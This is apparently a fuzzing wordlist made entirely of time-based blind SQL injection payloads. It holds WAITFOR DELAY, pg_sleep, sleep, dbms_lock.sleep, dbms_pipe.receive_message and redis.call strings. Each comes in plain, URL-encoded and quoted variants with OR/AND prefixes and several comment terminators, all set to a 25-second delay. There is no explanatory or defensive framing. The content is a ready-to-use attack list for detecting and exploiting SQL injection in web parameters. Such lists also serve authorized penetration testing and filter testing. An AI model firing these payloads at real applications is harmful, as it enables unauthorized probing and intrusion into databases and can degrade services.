+"++WAITFOR DELAY '00:00:25'+--+-"
+ OR++WAITFOR DELAY '00:00:25'+--+-
+%20OR%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" OR++WAITFOR DELAY '00:00:25'+--+-"
+ AND++WAITFOR DELAY '00:00:25'+--+-
+%20AND%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+" AND++WAITFOR DELAY '00:00:25'+--+-"
+ AND+AND WAITFOR DELAY '00:00:25' --+-
+%20AND%2BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++AND%2BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+" AND+AND WAITFOR DELAY '00:00:25' --+-"
+ OR+OR WAITFOR DELAY '00:00:25' --+-
+%20OR%2BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
++OR%2BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+--%2B-
+" OR+OR WAITFOR DELAY '00:00:25' --+-"
++ AND WAITFOR DELAY '00:00:25'+--+-
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"+ AND WAITFOR DELAY '00:00:25'+--+-"
++ OR WAITFOR DELAY '00:00:25'+--+-
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B--%2B-
+"+ OR WAITFOR DELAY '00:00:25'+--+-"
++ AND WAITFOR DELAY '00:00:25' --+-
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+"+ AND WAITFOR DELAY '00:00:25' --+-"
++ OR WAITFOR DELAY '00:00:25' --+-
+%2B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20--%2B-
+"+ OR WAITFOR DELAY '00:00:25' --+-"
++ pg_sleep(25) #
+%2B%20pg_sleep%2825%29%20%23
+%2B+pg_sleep%2825%29+%23
+'+ pg_sleep(25) #'
+++pg_sleep(25)+#
+%2B%2Bpg_sleep%2825%29%2B%23
+'++pg_sleep(25)+#'
+ OR++pg_sleep(25)+#
+%20OR%2B%2Bpg_sleep%2825%29%2B%23
+' OR++pg_sleep(25)+#'
+ AND++pg_sleep(25)+#
+%20AND%2B%2Bpg_sleep%2825%29%2B%23
+' AND++pg_sleep(25)+#'
+ AND+AND pg_sleep(25) #
+%20AND%2BAND%20pg_sleep%2825%29%20%23
++AND%2BAND+pg_sleep%2825%29+%23
+' AND+AND pg_sleep(25) #'
+ OR+OR pg_sleep(25) #
+%20OR%2BOR%20pg_sleep%2825%29%20%23
++OR%2BOR+pg_sleep%2825%29+%23
+' OR+OR pg_sleep(25) #'
++ AND pg_sleep(25)+#
+%2B%20AND%20pg_sleep%2825%29%2B%23
+'+ AND pg_sleep(25)+#'
++ OR pg_sleep(25)+#
+%2B%20AND%20pg_sleep%2825%29%2B%23
+'+ OR pg_sleep(25)+#'
++ AND pg_sleep(25) #
+%2B%20AND%20pg_sleep%2825%29%20%23
+'+ AND pg_sleep(25) #'
++ OR pg_sleep(25) #
+%2B%20OR%20pg_sleep%2825%29%20%23
+'+ OR pg_sleep(25) #'
++ dbms_pipe.receive_message(('a'),25) #
+%2B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+%2B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+"+ dbms_pipe.receive_message(('a'),25) #"
+++dbms_pipe.receive_message(('a'),25)+#
+%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"++dbms_pipe.receive_message(('a'),25)+#"
+ OR++dbms_pipe.receive_message(('a'),25)+#
+%20OR%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" OR++dbms_pipe.receive_message(('a'),25)+#"
+ AND++dbms_pipe.receive_message(('a'),25)+#
+%20AND%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+" AND++dbms_pipe.receive_message(('a'),25)+#"
+ AND+AND dbms_pipe.receive_message(('a'),25) #
+%20AND%2BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++AND%2BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+" AND+AND dbms_pipe.receive_message(('a'),25) #"
+ OR+OR dbms_pipe.receive_message(('a'),25) #
+%20OR%2BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
++OR%2BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%23
+" OR+OR dbms_pipe.receive_message(('a'),25) #"
++ AND dbms_pipe.receive_message(('a'),25)+#
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"+ AND dbms_pipe.receive_message(('a'),25)+#"
++ OR dbms_pipe.receive_message(('a'),25)+#
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B%23
+"+ OR dbms_pipe.receive_message(('a'),25)+#"
++ AND dbms_pipe.receive_message(('a'),25) #
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+"+ AND dbms_pipe.receive_message(('a'),25) #"
++ OR dbms_pipe.receive_message(('a'),25) #
+%2B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20%23
+"+ OR dbms_pipe.receive_message(('a'),25) #"
++ sleep(25) #
+%2B%20sleep%2825%29%20%23
+%2B+sleep%2825%29+%23
+'+ sleep(25) #'
+++sleep(25)+#
+%2B%2Bsleep%2825%29%2B%23
+'++sleep(25)+#'
+ OR++sleep(25)+#
+%20OR%2B%2Bsleep%2825%29%2B%23
+' OR++sleep(25)+#'
+ AND++sleep(25)+#
+%20AND%2B%2Bsleep%2825%29%2B%23
+' AND++sleep(25)+#'
+ AND+AND sleep(25) #
+%20AND%2BAND%20sleep%2825%29%20%23
++AND%2BAND+sleep%2825%29+%23
+' AND+AND sleep(25) #'
+ OR+OR sleep(25) #
+%20OR%2BOR%20sleep%2825%29%20%23
++OR%2BOR+sleep%2825%29+%23
+' OR+OR sleep(25) #'
++ AND sleep(25)+#
+%2B%20AND%20sleep%2825%29%2B%23
+'+ AND sleep(25)+#'
++ OR sleep(25)+#
+%2B%20AND%20sleep%2825%29%2B%23
+'+ OR sleep(25)+#'
++ AND sleep(25) #
+%2B%20AND%20sleep%2825%29%20%23
+'+ AND sleep(25) #'
++ OR sleep(25) #
+%2B%20OR%20sleep%2825%29%20%23
+'+ OR sleep(25) #'
++ dbms_lock.sleep(25) #
+%2B%20dbms_lock.sleep%2825%29%20%23
+%2B+dbms_lock.sleep%2825%29+%23
+'+ dbms_lock.sleep(25) #'
+++dbms_lock.sleep(25)+#
+%2B%2Bdbms_lock.sleep%2825%29%2B%23
+'++dbms_lock.sleep(25)+#'
+ OR++dbms_lock.sleep(25)+#
+%20OR%2B%2Bdbms_lock.sleep%2825%29%2B%23
+' OR++dbms_lock.sleep(25)+#'
+ AND++dbms_lock.sleep(25)+#
+%20AND%2B%2Bdbms_lock.sleep%2825%29%2B%23
+' AND++dbms_lock.sleep(25)+#'
+ AND+AND dbms_lock.sleep(25) #
+%20AND%2BAND%20dbms_lock.sleep%2825%29%20%23
++AND%2BAND+dbms_lock.sleep%2825%29+%23
+' AND+AND dbms_lock.sleep(25) #'
+ OR+OR dbms_lock.sleep(25) #
+%20OR%2BOR%20dbms_lock.sleep%2825%29%20%23
++OR%2BOR+dbms_lock.sleep%2825%29+%23
+' OR+OR dbms_lock.sleep(25) #'
++ AND dbms_lock.sleep(25)+#
+%2B%20AND%20dbms_lock.sleep%2825%29%2B%23
+'+ AND dbms_lock.sleep(25)+#'
++ OR dbms_lock.sleep(25)+#
+%2B%20AND%20dbms_lock.sleep%2825%29%2B%23
+'+ OR dbms_lock.sleep(25)+#'
++ AND dbms_lock.sleep(25) #
+%2B%20AND%20dbms_lock.sleep%2825%29%20%23
+'+ AND dbms_lock.sleep(25) #'
++ OR dbms_lock.sleep(25) #
+%2B%20OR%20dbms_lock.sleep%2825%29%20%23
+'+ OR dbms_lock.sleep(25) #'
++ redis.call("TIME")[25] #
+%2B%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+%2B+redis.call%28%22TIME%22%29%5B25%5D+%23
+'+ redis.call("TIME")[25] #'
+++redis.call("TIME")[25]+#
+%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+'++redis.call("TIME")[25]+#'
+ OR++redis.call("TIME")[25]+#
+%20OR%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' OR++redis.call("TIME")[25]+#'
+ AND++redis.call("TIME")[25]+#
+%20AND%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B%23
+' AND++redis.call("TIME")[25]+#'
+ AND+AND redis.call("TIME")[25] #
+%20AND%2BAND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++AND%2BAND+redis.call%28%22TIME%22%29%5B25%5D+%23
+' AND+AND redis.call("TIME")[25] #'
+ OR+OR redis.call("TIME")[25] #
+%20OR%2BOR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
++OR%2BOR+redis.call%28%22TIME%22%29%5B25%5D+%23
+' OR+OR redis.call("TIME")[25] #'
++ AND redis.call("TIME")[25]+#
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'+ AND redis.call("TIME")[25]+#'
++ OR redis.call("TIME")[25]+#
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B%23
+'+ OR redis.call("TIME")[25]+#'
++ AND redis.call("TIME")[25] #
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'+ AND redis.call("TIME")[25] #'
++ OR redis.call("TIME")[25] #
+%2B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20%23
+'+ OR redis.call("TIME")[25] #'
++ WAITFOR DELAY '00:00:25' #
+%2B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+%2B+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+"+ WAITFOR DELAY '00:00:25' #"
+++WAITFOR DELAY '00:00:25'+#
+%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"++WAITFOR DELAY '00:00:25'+#"
+ OR++WAITFOR DELAY '00:00:25'+#
+%20OR%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" OR++WAITFOR DELAY '00:00:25'+#"
+ AND++WAITFOR DELAY '00:00:25'+#
+%20AND%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+" AND++WAITFOR DELAY '00:00:25'+#"
+ AND+AND WAITFOR DELAY '00:00:25' #
+%20AND%2BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++AND%2BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+" AND+AND WAITFOR DELAY '00:00:25' #"
+ OR+OR WAITFOR DELAY '00:00:25' #
+%20OR%2BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
++OR%2BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+%23
+" OR+OR WAITFOR DELAY '00:00:25' #"
++ AND WAITFOR DELAY '00:00:25'+#
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"+ AND WAITFOR DELAY '00:00:25'+#"
++ OR WAITFOR DELAY '00:00:25'+#
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B%23
+"+ OR WAITFOR DELAY '00:00:25'+#"
++ AND WAITFOR DELAY '00:00:25' #
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+"+ AND WAITFOR DELAY '00:00:25' #"
++ OR WAITFOR DELAY '00:00:25' #
+%2B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20%23
+"+ OR WAITFOR DELAY '00:00:25' #"
++ pg_sleep(25) /**/
+%2B%20pg_sleep%2825%29%20/%2A%2A/
+%2B+pg_sleep%2825%29+%2F%2A%2A%2F
+'+ pg_sleep(25) /**/'
+++pg_sleep(25)+/**/
+%2B%2Bpg_sleep%2825%29%2B/%2A%2A/
+'++pg_sleep(25)+/**/'
+ OR++pg_sleep(25)+/**/
+%20OR%2B%2Bpg_sleep%2825%29%2B/%2A%2A/
+' OR++pg_sleep(25)+/**/'
+ AND++pg_sleep(25)+/**/
+%20AND%2B%2Bpg_sleep%2825%29%2B/%2A%2A/
+' AND++pg_sleep(25)+/**/'
+ AND+AND pg_sleep(25) /**/
+%20AND%2BAND%20pg_sleep%2825%29%20/%2A%2A/
++AND%2BAND+pg_sleep%2825%29+%2F%2A%2A%2F
+' AND+AND pg_sleep(25) /**/'
+ OR+OR pg_sleep(25) /**/
+%20OR%2BOR%20pg_sleep%2825%29%20/%2A%2A/
++OR%2BOR+pg_sleep%2825%29+%2F%2A%2A%2F
+' OR+OR pg_sleep(25) /**/'
++ AND pg_sleep(25)+/**/
+%2B%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+'+ AND pg_sleep(25)+/**/'
++ OR pg_sleep(25)+/**/
+%2B%20AND%20pg_sleep%2825%29%2B/%2A%2A/
+'+ OR pg_sleep(25)+/**/'
++ AND pg_sleep(25) /**/
+%2B%20AND%20pg_sleep%2825%29%20/%2A%2A/
+'+ AND pg_sleep(25) /**/'
++ OR pg_sleep(25) /**/
+%2B%20OR%20pg_sleep%2825%29%20/%2A%2A/
+'+ OR pg_sleep(25) /**/'
++ dbms_pipe.receive_message(('a'),25) /**/
+%2B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+%2B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+"+ dbms_pipe.receive_message(('a'),25) /**/"
+++dbms_pipe.receive_message(('a'),25)+/**/
+%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"++dbms_pipe.receive_message(('a'),25)+/**/"
+ OR++dbms_pipe.receive_message(('a'),25)+/**/
+%20OR%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" OR++dbms_pipe.receive_message(('a'),25)+/**/"
+ AND++dbms_pipe.receive_message(('a'),25)+/**/
+%20AND%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+" AND++dbms_pipe.receive_message(('a'),25)+/**/"
+ AND+AND dbms_pipe.receive_message(('a'),25) /**/
+%20AND%2BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++AND%2BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+" AND+AND dbms_pipe.receive_message(('a'),25) /**/"
+ OR+OR dbms_pipe.receive_message(('a'),25) /**/
+%20OR%2BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
++OR%2BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+%2F%2A%2A%2F
+" OR+OR dbms_pipe.receive_message(('a'),25) /**/"
++ AND dbms_pipe.receive_message(('a'),25)+/**/
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"+ AND dbms_pipe.receive_message(('a'),25)+/**/"
++ OR dbms_pipe.receive_message(('a'),25)+/**/
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B/%2A%2A/
+"+ OR dbms_pipe.receive_message(('a'),25)+/**/"
++ AND dbms_pipe.receive_message(('a'),25) /**/
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+"+ AND dbms_pipe.receive_message(('a'),25) /**/"
++ OR dbms_pipe.receive_message(('a'),25) /**/
+%2B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20/%2A%2A/
+"+ OR dbms_pipe.receive_message(('a'),25) /**/"
++ sleep(25) /**/
+%2B%20sleep%2825%29%20/%2A%2A/
+%2B+sleep%2825%29+%2F%2A%2A%2F
+'+ sleep(25) /**/'
+++sleep(25)+/**/
+%2B%2Bsleep%2825%29%2B/%2A%2A/
+'++sleep(25)+/**/'
+ OR++sleep(25)+/**/
+%20OR%2B%2Bsleep%2825%29%2B/%2A%2A/
+' OR++sleep(25)+/**/'
+ AND++sleep(25)+/**/
+%20AND%2B%2Bsleep%2825%29%2B/%2A%2A/
+' AND++sleep(25)+/**/'
+ AND+AND sleep(25) /**/
+%20AND%2BAND%20sleep%2825%29%20/%2A%2A/
++AND%2BAND+sleep%2825%29+%2F%2A%2A%2F
+' AND+AND sleep(25) /**/'
+ OR+OR sleep(25) /**/
+%20OR%2BOR%20sleep%2825%29%20/%2A%2A/
++OR%2BOR+sleep%2825%29+%2F%2A%2A%2F
+' OR+OR sleep(25) /**/'
++ AND sleep(25)+/**/
+%2B%20AND%20sleep%2825%29%2B/%2A%2A/
+'+ AND sleep(25)+/**/'
++ OR sleep(25)+/**/
+%2B%20AND%20sleep%2825%29%2B/%2A%2A/
+'+ OR sleep(25)+/**/'
++ AND sleep(25) /**/
+%2B%20AND%20sleep%2825%29%20/%2A%2A/
+'+ AND sleep(25) /**/'
++ OR sleep(25) /**/
+%2B%20OR%20sleep%2825%29%20/%2A%2A/
+'+ OR sleep(25) /**/'
++ dbms_lock.sleep(25) /**/
+%2B%20dbms_lock.sleep%2825%29%20/%2A%2A/
+%2B+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+'+ dbms_lock.sleep(25) /**/'
+++dbms_lock.sleep(25)+/**/
+%2B%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+'++dbms_lock.sleep(25)+/**/'
+ OR++dbms_lock.sleep(25)+/**/
+%20OR%2B%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' OR++dbms_lock.sleep(25)+/**/'
+ AND++dbms_lock.sleep(25)+/**/
+%20AND%2B%2Bdbms_lock.sleep%2825%29%2B/%2A%2A/
+' AND++dbms_lock.sleep(25)+/**/'
+ AND+AND dbms_lock.sleep(25) /**/
+%20AND%2BAND%20dbms_lock.sleep%2825%29%20/%2A%2A/
++AND%2BAND+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+' AND+AND dbms_lock.sleep(25) /**/'
+ OR+OR dbms_lock.sleep(25) /**/
+%20OR%2BOR%20dbms_lock.sleep%2825%29%20/%2A%2A/
++OR%2BOR+dbms_lock.sleep%2825%29+%2F%2A%2A%2F
+' OR+OR dbms_lock.sleep(25) /**/'
++ AND dbms_lock.sleep(25)+/**/
+%2B%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+'+ AND dbms_lock.sleep(25)+/**/'
++ OR dbms_lock.sleep(25)+/**/
+%2B%20AND%20dbms_lock.sleep%2825%29%2B/%2A%2A/
+'+ OR dbms_lock.sleep(25)+/**/'
++ AND dbms_lock.sleep(25) /**/
+%2B%20AND%20dbms_lock.sleep%2825%29%20/%2A%2A/
+'+ AND dbms_lock.sleep(25) /**/'
++ OR dbms_lock.sleep(25) /**/
+%2B%20OR%20dbms_lock.sleep%2825%29%20/%2A%2A/
+'+ OR dbms_lock.sleep(25) /**/'
++ redis.call("TIME")[25] /**/
+%2B%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+%2B+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+'+ redis.call("TIME")[25] /**/'
+++redis.call("TIME")[25]+/**/
+%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'++redis.call("TIME")[25]+/**/'
+ OR++redis.call("TIME")[25]+/**/
+%20OR%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' OR++redis.call("TIME")[25]+/**/'
+ AND++redis.call("TIME")[25]+/**/
+%20AND%2B%2Bredis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+' AND++redis.call("TIME")[25]+/**/'
+ AND+AND redis.call("TIME")[25] /**/
+%20AND%2BAND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++AND%2BAND+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' AND+AND redis.call("TIME")[25] /**/'
+ OR+OR redis.call("TIME")[25] /**/
+%20OR%2BOR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
++OR%2BOR+redis.call%28%22TIME%22%29%5B25%5D+%2F%2A%2A%2F
+' OR+OR redis.call("TIME")[25] /**/'
++ AND redis.call("TIME")[25]+/**/
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'+ AND redis.call("TIME")[25]+/**/'
++ OR redis.call("TIME")[25]+/**/
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%2B/%2A%2A/
+'+ OR redis.call("TIME")[25]+/**/'
++ AND redis.call("TIME")[25] /**/
+%2B%20AND%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'+ AND redis.call("TIME")[25] /**/'
++ OR redis.call("TIME")[25] /**/
+%2B%20OR%20redis.call%28%22TIME%22%29%5B25%5D%20/%2A%2A/
+'+ OR redis.call("TIME")[25] /**/'
++ WAITFOR DELAY '00:00:25' /**/
+%2B%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+%2B+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+"+ WAITFOR DELAY '00:00:25' /**/"
+++WAITFOR DELAY '00:00:25'+/**/
+%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"++WAITFOR DELAY '00:00:25'+/**/"
+ OR++WAITFOR DELAY '00:00:25'+/**/
+%20OR%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" OR++WAITFOR DELAY '00:00:25'+/**/"
+ AND++WAITFOR DELAY '00:00:25'+/**/
+%20AND%2B%2BWAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+" AND++WAITFOR DELAY '00:00:25'+/**/"
+ AND+AND WAITFOR DELAY '00:00:25' /**/
+%20AND%2BAND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++AND%2BAND+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+" AND+AND WAITFOR DELAY '00:00:25' /**/"
+ OR+OR WAITFOR DELAY '00:00:25' /**/
+%20OR%2BOR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
++OR%2BOR+WAITFOR+DELAY+%2700%3A00%3A25%27+%2F%2A%2A%2F
+" OR+OR WAITFOR DELAY '00:00:25' /**/"
++ AND WAITFOR DELAY '00:00:25'+/**/
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"+ AND WAITFOR DELAY '00:00:25'+/**/"
++ OR WAITFOR DELAY '00:00:25'+/**/
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%2B/%2A%2A/
+"+ OR WAITFOR DELAY '00:00:25'+/**/"
++ AND WAITFOR DELAY '00:00:25' /**/
+%2B%20AND%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+"+ AND WAITFOR DELAY '00:00:25' /**/"
++ OR WAITFOR DELAY '00:00:25' /**/
+%2B%20OR%20WAITFOR%20DELAY%20%2700%3A00%3A25%27%20/%2A%2A/
+"+ OR WAITFOR DELAY '00:00:25' /**/"
++ pg_sleep(25) -- -
+%2B%20pg_sleep%2825%29%20--%20-
+%2B+pg_sleep%2825%29+--+-
+'+ pg_sleep(25) -- -'
+++pg_sleep(25)+-- -
+%2B%2Bpg_sleep%2825%29%2B--%20-
+'++pg_sleep(25)+-- -'
+ OR++pg_sleep(25)+-- -
+%20OR%2B%2Bpg_sleep%2825%29%2B--%20-
+' OR++pg_sleep(25)+-- -'
+ AND++pg_sleep(25)+-- -
+%20AND%2B%2Bpg_sleep%2825%29%2B--%20-
+' AND++pg_sleep(25)+-- -'
+ AND+AND pg_sleep(25) -- -
+%20AND%2BAND%20pg_sleep%2825%29%20--%20-
++AND%2BAND+pg_sleep%2825%29+--+-
+' AND+AND pg_sleep(25) -- -'
+ OR+OR pg_sleep(25) -- -
+%20OR%2BOR%20pg_sleep%2825%29%20--%20-
++OR%2BOR+pg_sleep%2825%29+--+-
+' OR+OR pg_sleep(25) -- -'
++ AND pg_sleep(25)+-- -
+%2B%20AND%20pg_sleep%2825%29%2B--%20-
+'+ AND pg_sleep(25)+-- -'
++ OR pg_sleep(25)+-- -
+%2B%20AND%20pg_sleep%2825%29%2B--%20-
+'+ OR pg_sleep(25)+-- -'
++ AND pg_sleep(25) -- -
+%2B%20AND%20pg_sleep%2825%29%20--%20-
+'+ AND pg_sleep(25) -- -'
++ OR pg_sleep(25) -- -
+%2B%20OR%20pg_sleep%2825%29%20--%20-
+'+ OR pg_sleep(25) -- -'
++ dbms_pipe.receive_message(('a'),25) -- -
+%2B%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+%2B+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+"+ dbms_pipe.receive_message(('a'),25) -- -"
+++dbms_pipe.receive_message(('a'),25)+-- -
+%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"++dbms_pipe.receive_message(('a'),25)+-- -"
+ OR++dbms_pipe.receive_message(('a'),25)+-- -
+%20OR%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" OR++dbms_pipe.receive_message(('a'),25)+-- -"
+ AND++dbms_pipe.receive_message(('a'),25)+-- -
+%20AND%2B%2Bdbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+" AND++dbms_pipe.receive_message(('a'),25)+-- -"
+ AND+AND dbms_pipe.receive_message(('a'),25) -- -
+%20AND%2BAND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++AND%2BAND+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+" AND+AND dbms_pipe.receive_message(('a'),25) -- -"
+ OR+OR dbms_pipe.receive_message(('a'),25) -- -
+%20OR%2BOR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
++OR%2BOR+dbms_pipe.receive_message%28%28%27a%27%29%2C25%29+--+-
+" OR+OR dbms_pipe.receive_message(('a'),25) -- -"
++ AND dbms_pipe.receive_message(('a'),25)+-- -
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"+ AND dbms_pipe.receive_message(('a'),25)+-- -"
++ OR dbms_pipe.receive_message(('a'),25)+-- -
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%2B--%20-
+"+ OR dbms_pipe.receive_message(('a'),25)+-- -"
++ AND dbms_pipe.receive_message(('a'),25) -- -
+%2B%20AND%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+"+ AND dbms_pipe.receive_message(('a'),25) -- -"
++ OR dbms_pipe.receive_message(('a'),25) -- -
+%2B%20OR%20dbms_pipe.receive_message%28%28%27a%27%29%2C25%29%20--%20-
+"+ OR dbms_pipe.receive_message(('a'),25) -- -"
++ sleep(25) -- -
+%2B%20sleep%2825%29%20--%20-
+%2B+sleep%2825%29+--+-
+'+ sleep(25) -- -'
+++sleep(25)+-- -
+%2B%2Bsleep%2825%29%2B--%20-
+'++sleep(25)+-- -'
+ OR++sleep(25)+-- -
+%20OR%2B%2Bsleep%2825%29%2B--%20-
+' OR++sleep(25)+-- -'
+ AND++sleep(25)+-- -
+%20AND%2B%2Bsleep%2825%29%2B--%20-
+' AND++sleep(25)+-- -'
+ AND+AND sleep(25) -- -
+%20AND%2BAND%20sleep%2825%29%20--%20-
++AND%2BAND+sleep%2825%29+--+-
+' AND+AND sleep(25) -- -'
+ OR+OR sleep(25) -- -
+%20OR%2BOR%20sleep%2825%29%20--%20-
++OR%2BOR+sleep%2825%29+--+-
+' OR+OR sleep(25) -- -'
++ AND sleep(25)+-- -
+%2B%20AND%20sleep%2825%29%2B--%20-
+'+ AND sleep(25)+-- -'
++ OR sleep(25)+-- -
+%2B%20AND%20sleep%2825%29%2B--%20-
+'+ OR sleep(25)+-- -'
++ AND sleep(25) -- -
+%2B%20AND%20sleep%2825%29%20--%20-
+'+ AND sleep(25) -- -'
++ OR sleep(25) -- -
+%2B%20OR%20sleep%2825%29%20--%20-
+'+ OR sleep(25) -- -'
++ dbms_lock.sleep(25) -- -
+%2B%20dbms_lock.sleep%2825%29%20--%20-
+%2B+dbms_lock.sleep%2825%29+--+-
+'+ dbms_lock.sleep(25) -- -'
+++dbms_lock.sleep(25)+-- -
+%2B%2Bdbms_lock.sleep%2825%29%2B--%20-
+'++dbms_lock.sleep(25)+-- -'
+ OR++dbms_lock.sleep(25)+-- -
+%20OR%2B%2Bdbms_lock.sleep%2825%29%2B--%20-
+' OR++dbms_lock.sleep(25)+-- -'
+ AND++dbms_lock.sleep(25)+-- -
+%20AND%2B%2Bdbms_lock.sleep%2825%29%2B--%20-
+' AND++dbms_lock.sleep(25)+-- -'
+ AND+AND dbms_lock.sleep(25) -- -
+%20AND%2BAND%20dbms_lock.sleep%2825%29%20--%20-
++AND%2BAND+dbms_lock.sleep%2825%29+--+-
+' AND+AND dbms_lock.sleep(25) -- -'
+ OR+OR dbms_lock.sleep(25) -- -
+%20OR%2BOR%20dbms_lock.sleep%2825%29%20--%20-
++OR%2BOR+dbms_lock.sleep%2825%29+--+-
+' OR+OR dbms_lock.sleep(25) -- -'
++ AND dbms_lock.sleep(25)+-- -
+%2B%20AND%20dbms_lock.sleep%2825%29%2B--%20-
